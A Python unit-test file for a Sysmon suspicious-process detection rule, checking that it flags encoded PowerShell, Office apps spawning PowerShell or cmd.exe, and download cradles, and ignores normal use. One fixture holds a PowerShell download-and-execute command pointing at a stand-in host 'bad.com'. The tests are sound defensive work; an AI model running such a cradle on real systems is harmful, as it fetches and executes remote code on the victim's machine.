#!/usr/bin/env python3
"""
Unit tests for Sysmon detection rules.
"""

import sys
import unittest
from pathlib import Path

# Add paths
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root / "lib" / "panther-mock"))
sys.path.insert(0, str(project_root / "detections" / "panther" / "helpers"))

from engine import DetectionEngine


class TestSysmonSuspiciousProcess(unittest.TestCase):
    """Tests for sysmon_suspicious_process.py detection."""

    @classmethod
    def setUpClass(cls):
        cls.engine = DetectionEngine()
        cls.detection = cls.engine.load_rule(
            project_root / "detections" / "panther" / "rules" / "sysmon_suspicious_process.py"
        )

    def test_encoded_powershell_matches(self):
        """Should match encoded PowerShell commands."""
        event = {
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -encodedcommand SQBFAFgA...",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "User": "DESKTOP\\user",
        }
        result = self.engine.run_detection(self.detection, event)
        self.assertTrue(result.matched)
        self.assertEqual(result.severity, "HIGH")

    def test_office_spawning_powershell_matches(self):
        """Should match Office applications spawning PowerShell."""
        event = {
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -nop -w hidden",
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "User": "DESKTOP\\user",
        }
        result = self.engine.run_detection(self.detection, event)
        self.assertTrue(result.matched)
        self.assertEqual(result.severity, "HIGH")

    def test_office_spawning_cmd_matches(self):
        """Should match Office spawning cmd.exe."""
        event = {
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c whoami",
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
            "User": "DESKTOP\\user",
        }
        result = self.engine.run_detection(self.detection, event)
        self.assertTrue(result.matched)

    def test_download_string_matches(self):
        """Should match PowerShell with downloadstring."""
        event = {
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://bad.com')\"",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "User": "DESKTOP\\user",
        }
        result = self.engine.run_detection(self.detection, event)
        self.assertTrue(result.matched)

    def test_normal_powershell_no_match(self):
        """Should not match normal PowerShell usage."""
        event = {
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe Get-Process",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "User": "DESKTOP\\user",
        }
        result = self.engine.run_detection(self.detection, event)
        self.assertFalse(result.matched)

    def test_non_process_creation_no_match(self):
        """Should not match non-process-creation events."""
        event = {
            "EventID": 3,  # Network connection
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "DestinationIp": "1.2.3.4",
        }
        result = self.engine.run_detection(self.detection, event)
        self.assertFalse(result.matched)

    def test_normal_cmd_no_match(self):
        """Should not match normal cmd.exe from explorer."""
        event = {
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "User": "DESKTOP\\user",
        }
        result = self.engine.run_detection(self.detection, event)
        self.assertFalse(result.matched)

    def test_alert_context_populated(self):
        """Alert context should contain relevant information."""
        event = {
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell -enc ABC123",
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "ParentCommandLine": "winword.exe malicious.doc",
            "User": "DESKTOP\\victim",
            "ProcessId": 1234,
            "Computer": "DESKTOP-ABC",
        }
        result = self.engine.run_detection(self.detection, event)
        self.assertTrue(result.matched)
        self.assertIsNotNone(result.alert_context)
        self.assertEqual(result.alert_context["user"], "DESKTOP\\victim")
        self.assertEqual(result.alert_context["hostname"], "DESKTOP-ABC")


if __name__ == "__main__":
    unittest.main()
